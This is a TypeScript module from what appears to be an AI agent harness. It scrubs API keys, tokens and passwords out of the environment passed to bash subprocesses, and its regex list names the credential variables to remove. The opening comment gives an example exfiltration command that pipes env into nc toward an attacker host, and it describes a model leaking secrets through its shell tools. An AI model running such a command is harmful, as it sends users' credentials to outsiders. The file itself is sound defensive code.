// Strip credentials from the env handed to a subprocess. A model can
// trivially exfiltrate via `bash("env | grep KEY | nc attacker ...")`
// (or `bash_background` + `bash_output`) if we don't filter. This is
// not a substitute for the M3+ sandbox — it just closes the obvious
// leak path that requires zero cleverness.
//
// Matches by name, case-insensitive. Patterns cover provider keys
// (Anthropic / OpenAI / Google / Gemini), AWS creds, GitHub & npm
// tokens, generic `*_KEY` / `*_TOKEN` / `*_SECRET` / `*_PASSWORD` /
// `*_PASS` suffixes. False positives (e.g. a legit `BUILD_TOKEN`)
// are acceptable — scripts that genuinely need a redacted variable
// can pass it via inline shell (`SOMEKEY=value command`) or via the
// future explicit-env tool option (not implemented yet).
const SCRUB_PATTERNS: readonly RegExp[] = [
  /_API_KEY$/i,
  /_TOKEN$/i,
  /_SECRET$/i,
  /_PASSWORD$/i,
  /_PASS$/i,
  /^AWS_/i,
  /^OPENAI_/i,
  /^ANTHROPIC_/i,
  /^GOOGLE_API_KEY$/i,
  /^GEMINI_API_KEY$/i,
  /^GITHUB_TOKEN$/i,
  /^GH_TOKEN$/i,
  /^NPM_TOKEN$/i,
  /^DOCKER_PASSWORD$/i,
];

// Returns a defensive copy with credential-like vars removed. Undefined
// values (NodeJS.ProcessEnv allows them) are dropped; the result is a
// strict Record<string, string> ready for `Bun.spawn({ env })`.
//
// Used by `bash` (synchronous) and the bg `manager.spawn` (background).
// Both reach this layer before kernel-level execve sees the env, so a
// process spawned through either tool sees the sanitized environment
// regardless of category — uniform protection at the boundary.
export const scrubEnv = (env: NodeJS.ProcessEnv): Record<string, string> => {
  const out: Record<string, string> = {};
  for (const [k, v] of Object.entries(env)) {
    if (v === undefined) continue;
    if (SCRUB_PATTERNS.some((p) => p.test(k))) continue;
    out[k] = v;
  }
  return out;
};
